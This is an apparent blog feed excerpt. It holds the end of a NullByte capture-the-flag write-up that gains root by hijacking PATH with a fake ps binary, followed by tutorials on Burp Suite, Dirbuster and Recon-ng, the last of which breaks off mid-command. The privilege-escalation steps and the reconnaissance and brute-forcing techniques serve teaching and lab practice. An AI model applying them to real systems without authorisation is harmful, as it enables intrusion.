 1555 pts/0    00:00:00 bash
 1605 pts/0    00:00:00 ps
</code></p>

<p>I played around with the executable, tried passing arguments, but it looks like it just calls ps and nothing else. In the ps manual, I paid attention to this:</p>

<blockquote><p>By default, ps selects all processes with the same effective user ID
(euid=EUID) as the current user and associated with the same terminal
as the invoker.</p></blockquote>

<p>So, we can see the succession for a normal ps is bash &ndash;> ps, and for the SUID binary is procwatch &ndash;> sh &ndash;> ps. Maybe we can intercept the call to ps by creating an arbitrary binary called ps and placing it in the PATH variable. And of course, we want a shell!</p>

<p><code>plain
cp /bin/sh /tmp/ps
</code></p>

<p>Let&rsquo;s look at the PATH environment variable:</p>

<p><code>plain
echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</code></p>

<p>Ok, since I&rsquo;ve placed the fake ps in /tmp, I want to add that to the path:</p>

<p><code>plain
export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:/var/www/backup$ echo $PATH
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</code></p>

<p>Fingers crossed, running procwatch again:</p>

<p>``` plain
ramses@NullByte:/var/www/backup$ ./procwatch</p>

<h1>whoami</h1>

<p>root
```</p>

<p>And we&rsquo;re root..the right way! :D</p>

<p>``` plain
/ You&rsquo;ll wish that you had done some of \
| the hard things when they were easier |
\ to do.                                /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Introduction to Burp Suite]]></title>
    <link href="http://chousensha.github.io/blog/2016/11/19/introduction-to-burp-suite/"/>
    <updated>2016-11-19T17:01:23-05:00</updated>
    <id>http://chousensha.github.io/blog/2016/11/19/introduction-to-burp-suite</id>
    <content type="html"><![CDATA[<p>Yes, the time has come for a full post on Burp Suite! I have delayed it for too long!</p>

<p>Before starting, here are some resources for learning about Burp:</p>

<p><a href="https://portswigger.net/burp/help/contents.html">Burp Suite Documentation</a></p>

<p><a href="http://aetherlab.teachable.com/p/burp-suite">Free introductory course on Burp Suite</a></p>

<p><a href="https://vimeo.com/album/3510171">Burp Suite for Web Application Security</a></p>

<!-- more -->


<p>Burp Suite is the primary tool used for performing web application security assessments. It acts as a proxy between your browser and the target, and it comes packed with powerful features to assist in penetration testing: spidering fuctionality, web scanning for vulnerabilities (pro version only), tools that allow you to perform different actions with web requests (will be covered in detail below), and customization ability through plugins.</p>

<h1>Introduction to Burp Suite</h1>

<p>Burp is a Java application, so you need to have Java installed (version 1.6 or later) to run it. It comes pre-installed in Kali, where you can find it in the Web Application Analysis category.</p>

<p>To use Burp, you need to configure your browser&rsquo;s proxy settings. Burp&rsquo;s proxy is listening on 127.0.0.1:8080. If you want to manually configure your browser to use it, refer to this <a href="https://portswigger.net/burp/help/suite_gettingstarted.html">getting started post</a>. I recommend using a browser add-on like <a href="https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/">FoxyProxy</a> to set up your proxies and toggle them with a click.</p>

<p>For <strong>Burp to work with HTTPS</strong> requests, you need to add Burp&rsquo;s CA certificate to your browser. Go to <a href="http://burp/">http://burp/</a> and click on CA Certificate to download it to your computer. In this demo I&rsquo;m using Firefox, but the steps should be similar in the rest of the browsers. In the Firefox menu, select Options or Preferences, then go to Advanced &ndash;> Certificates &ndash;> View Certificates. Click on the Authorities tab and choose Import to select your CA certificate, and check the option &ldquo;Trust this CA to identify web sites&rdquo;. Then click Ok, and restart Firefox. Burp should work now with HTTPS traffic, without issuing any security warnings.</p>

<h1>Burp Suite components</h1>

<p>The power of Burp comes from the interaction between its components, which you can individually access from the application tabs. Let&rsquo;s see each of them in action!</p>

<h2>Target</h2>

<p>Here you can see information about your target. The site map constructs a hierarchical representation of your target. Items requested are shown in black, those that Burp inferred from links etc. are in gray. As you browse with the proxy on, Burp will keep building the site map.</p>

<p><img class="center" src="/images/tools/burp/sitemap.png" title="&lsquo;sitemap&rsquo; &lsquo;target sitemap&rsquo;" ></p>

<p>You can configure the scope of your targets from the Scope tab. Alternately, you can right-click on the sitemap entries to perform other actions:</p>

<p><img class="center" src="/images/tools/burp/sitemap-menu.png" title="&lsquo;sitemap menu&rsquo; &lsquo;target sitemap menu&rsquo;" ></p>

<p>Clicking on the Filter bar lets you customize filtering options. Before starting the demo, I added my target to the scope and selected to hide the out-of scope items for a clearer view.</p>

<p><img class="center" src="/images/tools/burp/sitemap-filter.png" title="&lsquo;sitemap filter&rsquo; &lsquo;target sitemap filter&rsquo;" ></p>

<h2>Proxy</h2>

<p>This is the component that allows you to intercept and modify the requests between your browser and the target. You will get familiar with the Intercept tab, where you can inspect each request and response, modify it, or send it to other tools. The history tabs keep records for the HTTP and WebSockets messages. In the Options tab you have a plethora of configuration options for your Proxy. Take special note of the Response Modification options, which you can use to automatically modify the responses HTML to remove client-side logic and controls, or perform SSL stripping.</p>

<p><img class="center" src="/images/tools/burp/proxy-options.png" title="&lsquo;proxy response options&rsquo; &lsquo;response modification options&rsquo;" ></p>

<p>Right-clicking in the Raw tab will give you more options, among which there are some very useful ones such as copying the request as a Curl command, or constructing selected strings in Javascript and SQL (MySQL, Oracle, MS-SQL)</p>

<h2>Spider</h2>

<p>You can use Burp&rsquo;s spider to automatically crawl target applications. After you&rsquo;ve manually browsed the application, right-click the host or URL that you want to crawl in the site map, and choose &ldquo;Spider this host / branch&rdquo;. Then watch the number of requests being made in the Control tab. You can customize the spider in the Options tab. Passive spidering is enabled by default, allowing Burp to update the site map while you are manually browsing. Also, you can specify what the spider should do when encountering forms (ignoring them, automatically submitting with pre-determined values, prompting for guidance etc.) Be careful, as the spider may perform actions with repercussions on the target application, so an initial manual assessment followed by a strict configuration of the spidering scope would be preferred.</p>

<h2>Scanner</h2>

<p>Burp has an automatic vulnerability scanner <em>uncontrolled drooling</em> that seems excellent from the reviews, but it&rsquo;s only available for Pro users. If you look in the Issue definitions tab, you can see the <a href="https://portswigger.net/KnowledgeBase/Issues/">vulnerabilites that Burp can detect</a>, among with a description for each of them <em>drooling intensifies</em></p>

<p><img class="center" src="/images/tools/burp/scanner.png" title="&lsquo;burp scanner&rsquo; &lsquo;burp web scanner&rsquo;" ></p>

<h2>Intruder</h2>

<p>With Burp Intruder you can perform highly-customized automated attacks against your targets, including brute forcing, fuzzing, enumeration etc. Usually, you select an interesting request and send it to Intruder. You can see the positions where payloads will be placed, marked in orange in this dummy request:</p>

<p><img class="center" src="/images/tools/burp/intruder-position.png" title="&lsquo;intruder positions&rsquo; &lsquo;intruder payload positions&rsquo;" ></p>

<h3>Attack types</h3>

<p>In the Position tab, you can also choose the type of attack you want to perform:</p>

<ul>
<li><p><strong>Sniper</strong> &ndash; single set of payloads, places each payload into each position in turn, useful for individual parameter fuzzing</p></li>
<li><p><strong>Battering ram</strong> &ndash; single set of payloads, places the the same payload into all positions at the same time</p></li>
<li><p><strong>Pitchfork</strong> &ndash; multiple payload sets, different payload set for each position</p></li>
<li><p><strong>Cluster bomb</strong> &ndash; multiple payload sets, tests all permutations of the payload combinations, so depending on your payloads, this attack might grow to gigantic proportions</p></li>
</ul>


<h3>Payload types</h3>

<p>You have lots of payload types available for testing, so choose what is appropriate for your target:</p>

<ul>
<li><p><strong>Simple list</strong> &ndash; list of strings</p></li>
<li><p><strong>Runtime file</strong> &ndash; read strings at runtime from a file (for very large lists)</p></li>
<li><p><strong>Custom iterator</strong> &ndash; permutations of characters in multiple lists</p></li>
<li><p><strong>Character substitution</strong> &ndash; substitute characters, for instance when you are testing for 53cur3 p455w0rd5</p></li>
<li><p><strong>Case modification</strong> &ndash; change the characters' case according to the pre-defined rules</p></li>
<li><p><strong>Recursive grep</strong> &ndash; recursively extract data from the responses of previous requests</p></li>
<li><p><strong>Illegal Unicode</strong> &ndash; by using illegal Unicode representations, it might be possible to bypass filters etc.</p></li>
<li><p><strong>Character blocks</strong> &ndash; creates blocks of characters of specified sizes, can aid in detecting buffer overflows</p></li>
<li><p><strong>Numbers</strong> &ndash; numeric payloads</p></li>
<li><p><strong>Dates</strong> &ndash; date values</p></li>
<li><p><strong>Brute forcer</strong> &ndash; sets of permutations generated from specified characters</p></li>
<li><p><strong>Null payloads</strong> &ndash; empty string payloads</p></li>
<li><p><strong>Character frobber</strong> &ndash; changes the value of each character in turn, useful for determining what characters are being used for session tokens etc.</p></li>
<li><p><strong>Bit flipper</strong> &ndash; flips individual bits in the payload</p></li>
<li><p><strong>Username generator</strong> &ndash; generates usernames from the given input</p></li>
<li><p><strong>ECB block shuffler</strong> &ndash; shuffles ECB-encrypted blocks</p></li>
<li><p><strong>Extension generated</strong> &ndash; uses an extension to create the payloads</p></li>
<li><p><strong>Copy other payload</strong> &ndash; copies the current payload value to a different position</p></li>
</ul>


<h2>Repeater</h2>

<p>This tool is useful for sending requests over and over to the target application.</p>

<p><img class="center" src="/images/tools/burp/repeater.png" title="&lsquo;repeater&rsquo; &lsquo;repeater&rsquo;" ></p>

<h2>Sequencer</h2>

<p>With the Sequencer tool you can test for the randomness of data tokens in an target application. The analysis is more accurate if the number of captured tokens is larger.</p>

<p><img class="center" src="/images/tools/burp/sequencer.png" title="&lsquo;Burp sequencer&rsquo; &lsquo;Burp sequencer&rsquo;" ></p>

<h2>Decoder</h2>

<p>The Decoder tool performs encoding and decoding of different data formats, such as HTML, URL, Base64, ASCII hex, Hex, Octal, Binary, Gzip, and it also has hashing functionality for MD2, SHA-224, MD5, SHA1, SHA-384, SHA, SHA-512 and SHA-256.</p>

<p><img class="center" src="/images/tools/burp/decoder.png" title="&lsquo;Burp decoder&rsquo; &lsquo;Burp decoder&rsquo;" ></p>

<h2>Comparer</h2>

<p>If you want to compare different responses, this tool gives you the options of words or bytes comparison</p>

<p><img class="center" src="/images/tools/burp/comparer.png" title="&lsquo;Burp comparer&rsquo; &lsquo;Burp comparer&rsquo;" ></p>

<h2>Extender</h2>

<p>Here you can add extensions to Burp that add more functionality than what is available by default. Take a look at what extensions you can find in the BApp Store:</p>

<p><img class="center" src="/images/tools/burp/extensions.png" title="&lsquo;burp extensions&rsquo; &lsquo;burp extensions&rsquo;" ></p>

<p>In this screenshot I am sorting by rating. There are many extensions available and I suggest looking at each and determining if you will need it before choosing to install.</p>

<h3>Burp Clickbandit</h3>

<p>We&rsquo;re done with the main tools, but Burp has more. It even includes a cool tool for creating clickjacking attacks.</p>

<p><img class="center" src="/images/tools/burp/clickbandit.png" title="&lsquo;burp clickbandit&rsquo; &lsquo;burp clickbandit&rsquo;" ></p>

<p>In a future post I will do a lab featuring Burp&rsquo;s capabilities that I&rsquo;ve enumerated so far. Expect some Mutillidae! :&ndash;)</p>

<p>``` plain</p>

<hr />

<p>/ Don&rsquo;t you wish you had more energy&hellip; \
\ or less ambition?                     /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest tools - Dirbuster]]></title>
    <link href="http://chousensha.github.io/blog/2016/09/12/pentest-tools-dirbuster/"/>
    <updated>2016-09-12T02:21:55-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/09/12/pentest-tools-dirbuster</id>
    <content type="html"><![CDATA[<p>Dirbuster is a <a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">multithreaded Java application</a> that tries to find hidden files and directories on a target web application by brute forcing their names. Dirbuster comes with <a href="https://github.com/digination/dirbuster-ng/tree/master/wordlists">9 lists</a> of common file and directory names that were crawled from the internet, but you can choose to use your own. Pure brute forcing is also available, but due to the time constraints, the filelist option is by far the most commonly used</p>

<!-- more -->


<p>As an aside, you might have probably noticed that lately I&rsquo;ve been writing less writeups and have been focusing more on tools and system administration fundamentals. I thought that in the long run, this approach would yield better and faster results, both in CTF challenges and in real-life hacking (bug bounties, I&rsquo;m looking at you). While I haven&rsquo;t used Dirbuster so much, I was inspired to write a post for it after reading <a href="https://blog.it-securityguard.com/bugbounty-decoding-a-%F0%9F%98%B1-00000-htpasswd-bounty/">this blog post on how it helped in acquiring a nice bounty</a></p>

<p>With that said, let&rsquo;s take a look at Dirbuster&rsquo;s interface:</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster.png" title="&lsquo;dirbuster&rsquo; &lsquo;dirbuster interface&rsquo;" ></p>

<p>This tool is not complicated to use, nor does it have tons of other functionality besides discovering hidden resources. However, from my (limited) experience with it, the default settings might not work in the majority of cases (causing crashes and so on). A bit of fine tuning is required to get the most of your dirbusting experience, and is this that I will be covering here.</p>

<h1>Dirbuster configuration</h1>

<p>The first thing you will do when starting Dirbuster is to select a wordlist to use. The lists that come with Dirbuster are located in <code>/usr/share/dirbuster/wordlists/</code> on a Kali machine.</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-lists.png" title="&lsquo;dirbuster lists&rsquo; &lsquo;dirbuster default lists&rsquo;" ></p>

<ul>
<li><p><strong>Work method</strong> &ndash; leave the Auto Switch selected for fastest results. Dirbuster will try a HEAD request first, saving more bandwidth and latency than it would with a straight on GET request.</p></li>
<li><p><strong>Number of threads</strong> &ndash; the default is 10, but in my own testing, I found this excessive, so I am now starting with 3-5 threads. Since the <em>Go Faster</em> option allows you to jump over 100 threads, you might think the faster the better, but I noticed that Dirbuster has a really thin line between slow but working and fast but crashed. Maybe it&rsquo;s the local vulnerable installations I tested against, but it seems logical to treat a live target with more caution than a lab..you don&rsquo;t want to DOS your target in your search for goodies.</p></li>
</ul>


<p>In your choice of wordlist, take a second to review the target and see if it uses case sensitive resources (for instance, try seeing if admin returns the same as Admin, use lowecase lists if target is a IIS web server etc.). This will help you decide what list is most appropriate for the job, and save you precious time.</p>

<p>Under the starting options, you will tweak things as needed, because there is no one-size-fits-all approach to these checkboxes. The <strong>standard start point</strong> considers directories as ending with a / slash, and files ending with the specified extension. It&rsquo;s best not to run with all the options checked at the same time, as this will take significant time and it may potentially crash the target. I separate the <em>Brute Force Directories</em> and <em>Brute Force Files</em> + <em>Use Blank Extension</em>. As always, the target dictates the weapon, so time constraints and the sensitivity of the target should also be taken into consideration for the <em>Be Recursive</em> option, which I toggle as necessary.</p>

<p>The <strong>URL fuzz</strong> option allows you to enter the words in the lists directly in the URL, in a template like manner. An example offered by Dirbuster is  <code>test.html?url={dir}.asp</code>, where the content in curly brackets will be substituted for the words in list.</p>

<h2>Dirbuster Options</h2>

<p>In the Options tab, you can further tweak your Dirbuster installation.</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-options.png" title="&lsquo;dirbuster options&rsquo; &lsquo;dirbuster options&rsquo;" ></p>

<ul>
<li><p><strong>Follow redirects</strong> &ndash; I check this, but it does come with an overhead increase, you might want to leave it unchecked and manually navigate to interesting places that were found</p></li>
<li><p><strong>Parse HTML</strong> is on by default, and it lets Dirbuster read the HTML and look there for other files and folders that it won&rsquo;t have to guess</p></li>
</ul>


<p>In the Advanced options, there a few more tabs you can configure. The Dirbuster Options tab allows you to set some default values so you don&rsquo;t have to change them each time you start the application.</p>

<p>In the HTML Parsing tab you can configure which HTML elements to extract links from, along with file extensions that should not be processed.</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-html.png" title="&lsquo;dirbuster html options&rsquo; &lsquo;dirbuster html parsing&rsquo;" ></p>

<p>The Authentication tabs covers authentication options for Basic, Digest and NTLM authentication. In the HTTP Options tab you might want to spend a few moments to change the blatantly conspicuous user agent. Also, note the <em>Run through a proxy</em> option, which is available if you want to..well, run Dirbuster through a proxy. It&rsquo;s also possible to add custom headers, maybe you want to add a cookie to use Dirbuster as an authenticated user. That might be risky if your user privileges allow you to perform certain actions on the target, so you might want to restrict other options in this case (maybe you don&rsquo;t want to follow all the links in case one of them does something you really wouldn&rsquo;t want to, and so on).</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-http.png" title="&lsquo;dirbuster http options&rsquo; &lsquo;dirbuster http options&rsquo;" ></p>

<p>Finally, there&rsquo;s the Scan options tab. I chose to decrease the default <em>Connection Timeout</em> value from 30 to 10 seconds and to limit the number of requests per second. You can also see the failcase string that Dirbuster uses to determine if a resource is actually there or not.</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-scan.png" title="&lsquo;dirbuster scan options&rsquo; &lsquo;dirbuster scan options&rsquo;" ></p>

<p>After running a scan, you can see the results found, including the HTTP response code and the size. I ran a test scan against Mutillidae with threads blazing for the demo:</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-results.png" title="&lsquo;dirbuster scan results&rsquo; &lsquo;dirbuster scan results&rsquo;" ></p>

<p>You can also see the results in a tree view, for better readability:</p>

<p><img class="center" src="/images/tools/dirbuster/dirbuster-tree.png" title="&lsquo;dirbuster tree&rsquo; &lsquo;dirbuster tree results&rsquo;" ></p>

<p>This concludes the post on Dirbuster. Despite being unmaintained (not sure if that&rsquo;s a word), it&rsquo;s still the go-to application for files and folders discovery. Use it early in the recon process (after you took a look at the target to know which settings to apply) for best results!</p>

<p>``` plain</p>

<hr />

<p>/ Fine day for friends. So-so day for \
\ you.                                /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest tools - Recon-ng]]></title>
    <link href="http://chousensha.github.io/blog/2016/08/29/pentest-tools-recon-ng/"/>
    <updated>2016-08-29T15:30:18-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/08/29/pentest-tools-recon-ng</id>
    <content type="html"><![CDATA[<p>In this post I&rsquo;ll discuss the use of the powerful web reconaissance framework, Recon-ng.</p>

<p><a href="https://bitbucket.org/LaNMaSteR53/recon-ng">Recon-ng is a full-featured Web Reconnaissance framework written in Python. Complete with independent modules, database interaction, built in convenience functions, interactive help, and command completion, Recon-ng provides a powerful environment in which open source web-based reconnaissance can be conducted quickly and thoroughly.</a></p>

<!-- more -->


<p>Recon-ng is an invaluable tool for performing information gathering. It is modeled on the Metasploit framework, so the interface and functionality are pretty similar.</p>

<p><img class="center" src="/images/tools/recon-ng.png" title="&lsquo;recon-ng&rsquo; &lsquo;recon-ng&rsquo;" ></p>

<h1>Recon-ng core commands</h1>

<p>With the help menu, you can get an overview of what commands are available:</p>

<p>``` plain
[recon-ng][default] > help</p>

<h2>Commands (type [help|?] <topic>):</h2>

<p>add             Adds records to the database
back            Exits the current context
delete          Deletes records from the database
exit            Exits the framework
help            Displays this menu
keys            Manages framework API keys
load            Loads specified module
pdb             Starts a Python Debugger session
query           Queries the database
record          Records commands to a resource file
reload          Reloads all modules
resource        Executes commands from a resource file
search          Searches available modules
set             Sets module options
shell           Executes shell commands
show            Shows various framework items
snapshots       Manages workspace snapshots
spool           Spools output to a file
unset           Unsets module options
use             Loads specified module
workspaces      Manages workspaces
```</p>

<p>You can already see the similarity with Metasploit. Let&rsquo;s focus on what&rsquo;s exclusive to to Recon-ng, the powerful recon capabilities. You can leverage different search engines and social media for information gathering. To leverage the most of this functionality, you will need to use API keys. Below you can see the available APIs:</p>

<p>``` plain
[recon-ng][default] > keys list</p>

<p>  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  |        Name       | Value |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
  | bing_api          |       |
  | builtwith_api     |       |
  | facebook_api      |       |
  | facebook_password |       |
  | facebook_secret   |       |
  | facebook_username |       |
  | flickr_api        |       |
  | fullcontact_api   |       |
  | google_api        |       |
  | google_cse        |       |
  | instagram_api     |       |
  | instagram_secret  |       |
  | ipinfodb_api      |       |
  | jigsaw_api        |       |
  | jigsaw_password   |       |
  | jigsaw_username   |       |
  | linkedin_api      |       |
  | linkedin_secret   |       |
  | pwnedlist_api     |       |
  | pwnedlist_iv      |       |
  | pwnedlist_secret  |       |
  | shodan_api        |       |
  | twitter_api       |       |
  | twitter_secret    |       |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+
```</p>

<p>In addition to the well known APIs of the main search engines and social media, there are the following:</p>

<ul>
<li><p>the BuiltWith Domain API, which provides XML and JSON access to the technology information of a website</p></li>
<li><p>FullContact lets you easily query by email, phone number, or Twitter username. Results include publicly- available social profiles, photos, basic demographics, job titles, company stats, and over 100 other public data points.</p></li>
<li><p>IPInfoDB, which provides free access to IP geolocation tools</p></li>
<li><p>Jigsaw is an online directory of free, downloadable Company information and more than 11 million business Contacts. Every Jigsaw business Contact is complete with hard-to-find direct dials and email addresses, while each Company record gives the low down on Company size, location, and industry.</p></li>
<li><p>PwnedList is designed for consumers to check if their email address has been found on commonly circulating lists of stolen accounts and passwords (this has been shut down at the time of this writing)</p></li>
</ul>


<p>If you were to add a new API key, you could do it like this:</p>

<p>``` plain
[recon-ng][default] > keys add bing_api 007007
[*] Key &lsquo;bing_api&rsquo; added.
[recon-ng][default] > keys list</p>

<p>  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
  |        Name       | Value  |
  +&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
  | bing_api          | 007007 |
```</p>

<p>To delete an API key, you can use the <code>keys delete</code> command.</p>

<p>To see what items are available in the framework, use the <strong>show</strong> command:</p>

<p>``` plain
[recon-ng][default] > show
Shows various framework items</p>

<p>Usage: show [banner|companies|contacts|credentials|dashboard|domains|hosts|leaks|locations|modules|netblocks|options|ports|profiles|pushpins|schema|vulnerabilities]
```</p>

<p>This should give you an idea of the kinds of data you can look for. Again, this should feel similar to Metasploit. In fact, like in the msfconsole, the modules are what you will use to perform different tasks. Let&rsquo;s take a look at all the currently available modules. Oh, and did I mention there is tab completion as well? :D</p>

<h1>Recon-ng modules</h1>

<p>``` plain
show modules</p>

<p>  Discovery</p>

<hr />

<pre><code>discovery/info_disclosure/cache_snoop
discovery/info_disclosure/interesting_files
</code></pre>

<p>  Exploitation</p>

<hr />

<pre><code>exploitation/injection/command_injector
exploitation/injection/xpath_bruter
</code></pre>

<p>  Import</p>

<hr />

<pre><code>import/csv_file
import/list
</code></pre>

<p>  Recon</p>

<hr />

<pre><code>recon/companies-contacts/facebook
recon/companies-contacts/jigsaw/point_usage
recon/companies-contacts/jigsaw/purchase_contact
recon/companies-contacts/jigsaw/search_contacts
recon/companies-contacts/jigsaw_auth
recon/companies-contacts/linkedin_auth
recon/companies-multi/whois_miner
recon/companies-profiles/bing_linkedin
recon/contacts-contacts/mailtester
recon/contacts-contacts/mangle
recon/contacts-contacts/unmangle
recon/contacts-credentials/hibp_breach
recon/contacts-credentials/hibp_paste
recon/contacts-credentials/pwnedlist
recon/contacts-domains/migrate_contacts
recon/contacts-profiles/fullcontact
recon/credentials-credentials/adobe
recon/credentials-credentials/bozocrack
recon/credentials-credentials/hashes_org
recon/credentials-credentials/leakdb
recon/domains-contacts/pgp_search
recon/domains-contacts/salesmaple
recon/domains-contacts/whois_pocs
recon/domains-credentials/pwnedlist/account_creds
recon/domains-credentials/pwnedlist/api_usage
recon/domains-credentials/pwnedlist/domain_creds
recon/domains-credentials/pwnedlist/domain_ispwned
recon/domains-credentials/pwnedlist/leak_lookup
recon/domains-credentials/pwnedlist/leaks_dump
recon/domains-domains/brute_suffix
recon/domains-hosts/baidu_site
recon/domains-hosts/bing_domain_api
recon/domains-hosts/bing_domain_web
recon/domains-hosts/brute_hosts
recon/domains-hosts/builtwith
recon/domains-hosts/google_site_api
recon/domains-hosts/google_site_web
recon/domains-hosts/netcraft
recon/domains-hosts/shodan_hostname
recon/domains-hosts/ssl_san
recon/domains-hosts/vpnhunter
recon/domains-hosts/yahoo_domain
recon/domains-vulnerabilities/punkspider
recon/domains-vulnerabilities/xssed
recon/domains-vulnerabilities/xssposed
recon/hosts-domains/migrate_hosts
recon/hosts-hosts/bing_ip
recon/hosts-hosts/freegeoip
recon/hosts-hosts/ip_neighbor
recon/hosts-hosts/ipinfodb
recon/hosts-hosts/resolve
recon/hosts-hosts/reverse_resolve
recon/locations-locations/geocode
recon/locations-locations/reverse_geocode
recon/locations-pushpins/flickr
recon/locations-pushpins/instagram
recon/locations-pushpins/picasa
recon/locations-pushpins/shodan
recon/locations-pushpins/twitter
recon/locations-pushpins/youtube
recon/netblocks-companies/whois_orgs
recon/netblocks-hosts/reverse_resolve
recon/netblocks-hosts/shodan_net
recon/netblocks-ports/census_2012
recon/ports-hosts/migrate_ports
recon/profiles-contacts/dev_diver
recon/profiles-contacts/linkedin
recon/profiles-profiles/linkedin_crawl
recon/profiles-profiles/namechk
recon/profiles-profiles/profiler
recon/profiles-profiles/twitter
</code></pre>

<p>  Reporting</p>

<hr />

<pre><code>reporting/csv
reporting/html
reporting/json
reporting/list
reporting/pushpin
reporting/xlsx
reporting/xml
</code></pre>

<p>```</p>

<p>You can select a module via the <strong>load</strong> or <strong>use</strong> commands. Once in a module&rsquo;s context, you can see information about it with the <code>show info</code> command. Similarly, you can see the required options for a module with the <code>show options</code> command, and change them with <strong>set</strong>. Let&rsquo;s look at each module and see some usage examples</p>

<h2>Discovery</h2>

<ul>
<li><p>DNS Cache Snooper &ndash; Uses the DNS cache snooping technique to check for visited domains</p></li>
<li><p>Interesting File Finder &ndash; Checks hosts for interesting files in predictable locations</p></li>
</ul>


<p>Let&rsquo;s see more about this module:</p>

<p>``` plain
[recon-ng][default][interesting_files] > show info</p>

<pre><code>  Name: Interesting File Finder
  Path: modules/discovery/info_disclosure/interesting_files.py
Author: Tim Tomes (@LaNMaSteR53), thrapt (thrapt@gmail.com), Jay Turla (@shipcod3), and Mark Jeffery
</code></pre>

<p>Description:
  Checks hosts for interesting files in predictable locations.</p>

<p>Options:
  Name      Current Value  Required  Description</p>

<hr />

<p>  DOWNLOAD  True           yes       download discovered files
  PORT      80             yes       request port
  PROTOCOL  http           yes       request protocol
  SOURCE    default        yes       source of input (see &lsquo;show info&rsquo; for details)</p>

<p>Source Options:
  default        SELECT DISTINCT host FROM hosts WHERE host IS NOT NULL ORDER BY host
  <string>       string representing a single input
  <path>         path to a file containing a list of inputs
  query <sql>    database query returning one column of inputs</p>

<p>Comments:
  * Files: robots.txt, sitemap.xml, sitemap.xml.gz, crossdomain.xml, phpinfo.php, test.php, elmah.axd,
  server-status, jmx-console/, admin-console/, web-console/
  * Google Dorks:</p>

<pre><code>- inurl:robots.txt ext:txt
- inurl:elmah.axd ext:axd intitle:"Error log for"
- inurl:server-status "Apache Status"
</code></pre>

<p>```</p>

<p>I found this a bit confusing at first, but the SOURCE is the equivalent of the target you do recon on. I ran this on my own blog for a demo. When setting a target, keep in mind not to include the http or https (the protocol setting handles that), and also to exclude the trailing slash (I got errors until I did that).</p>

<p><code>plain
[recon-ng][default][interesting_files] &gt; run
[*] http://chousensha.github.io:80/robots.txt =&gt; 200. 'robots.txt' found!
[*] http://chousensha.github.io:80/sitemap.xml =&gt; 200. 'sitemap.xml' found!
[*] http://chousensha.github.io:80/sitemap.xml.gz =&gt; 404
[*] http://chousensha.github.io:80/crossdomain.xml =&gt; 404
[*] http://chousensha.github.io:80/phpinfo.php =&gt; 404
[*] http://chousensha.github.io:80/test.php =&gt; 404
[*] http://chousensha.github.io:80/elmah.axd =&gt; 404
[*] http://chousensha.github.io:80/server-status =&gt; 404
[*] http://chousensha.github.io:80/jmx-console/ =&gt; 404
[*] http://chousensha.github.io:80/admin-console/ =&gt; 404
[*] http://chousensha.github.io:80/web-console/ =&gt; 404
[*] 2 interesting files found.
[*] ...downloaded to '/root/.recon-ng/workspaces/default/'
</code></p>

<p>You can see recon-ng found 2 interesting files and it downloaded them to my machine</p>

<h2>Exploitation</h2>

<ul>
<li><p>Remote Command Injection Shell Interface &ndash; Provides a shell interface for remote command injection flaws in web applications</p></li>
<li><p>Xpath Injection Brute Forcer &ndash; Exploits XPath injection flaws to enumerate the contents of serverside XML documents</p></li>
</ul>


<h2>Import</h2>

<ul>
<li><p>Advanced CSV File Importer &ndash; Imports values from a CSV file into a database table.</p></li>
<li><p>List File Importer &ndash; Imports values from a list file into a database table and column</p></li>
</ul>


<h2>Recon</h2>

<ul>
<li><p>Facebook Contact Enumerator &ndash; Harvests contacts from Facebook.com. Updates the &lsquo;contacts&rsquo; table with the results</p></li>
<li><p>Jigsaw &ndash; Point Usage Statistics Fetcher &ndash; Queries the Jigsaw API for the point usage statistics of the given account.</p></li>
<li><p>Jigsaw &ndash; Single Contact Retriever &ndash; Retrieves a single complete contact from the Jigsaw.com API using points from the given account</p></li>
<li><p>Jigsaw Contact Enumerator &ndash; Harvests contacts from the Jigsaw.com API. Updates the &lsquo;contacts&rsquo; table with the results</p></li>
<li><p>Jigsaw Authenticated Contact Enumerator &ndash; Harvests contacts from Data.com using an authenticated user account. Updates the &lsquo;contacts&rsquo; table
with the results. Use &lsquo;keys&rsquo; to set your jigsaw username and password before use.</p></li>
<li><p>LinkedIn Authenticated Contact Enumerator &ndash; Harvests contacts from the LinkedIn.com API using an authenticated connections network. Updates the
&lsquo;contacts&rsquo; table with the results.</p></li>
<li><p>Whois Data Miner &ndash; Uses the ARIN Whois RWS to harvest companies, locations, netblocks, and contacts associated with the
given company search string. Updates the respective tables with the results.</p></li>
</ul>


<p>Let&rsquo;s see this in action against Yahoo:</p>

<p>``` plain
[recon-ng][default][whois_miner] > run
